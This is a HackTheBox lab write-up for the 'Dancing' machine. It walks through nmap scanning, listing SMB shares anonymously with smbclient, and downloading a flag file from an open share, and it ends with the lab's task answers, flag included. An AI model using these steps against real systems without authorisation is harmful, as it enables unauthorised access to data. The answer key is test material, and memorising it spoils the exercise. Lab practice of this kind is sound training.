TITLE: Dancing
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/ce52eadd09ff5a28a1eea8c65d6683a9.png.1
---

# Dancing

Dancing focuses on Server Message Block (SMB) enumeration and accessing unprotected network shares.

## Recon

Nmap reveals that the SMB service is open on port 445.

```bash
nmap -sC -sV 10.129.171.104
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 445 | SMB | Windows Server 2019 Standard 17763 |

## Exploitation

We use `smbclient` to list available shares on the target machine without providing a password.

```bash
smbclient -L 10.129.171.104 -N
```

| Sharename | Type | Comment |
| :--- | :--- | :--- |
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| WorkShares | Disk | |

The `WorkShares` share looks interesting. We connect to it anonymously:

```bash
smbclient //10.129.171.104/WorkShares -N
```

We navigate through the directories:
1. `cd Amy.J`
2. `cd work`
3. `ls` -> `flag.txt`
4. `get flag.txt`

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | What does the 3nd-letter acronym SMB stand for? | `Server Message Block` |
| 2 | What port does SMB use to operate at? | `445` |
| 3 | What is the service name for port 445 that came up in our Nmap scan? | `microsoft-ds` |
| 4 | What is the 'workgroup' name that is identified in the scan? | `WORKGROUP` |
| 5 | What is the name of the share we can connect to? | `WorkShares` |
| 6 | What command can we use to list the shares? | `smbclient -L` |
| 7 | What is the command to download a file from the share? | `get` |
| 8 | Submit root flag | `5f61c10dffbc77a7044254c7a84c6c4c` |
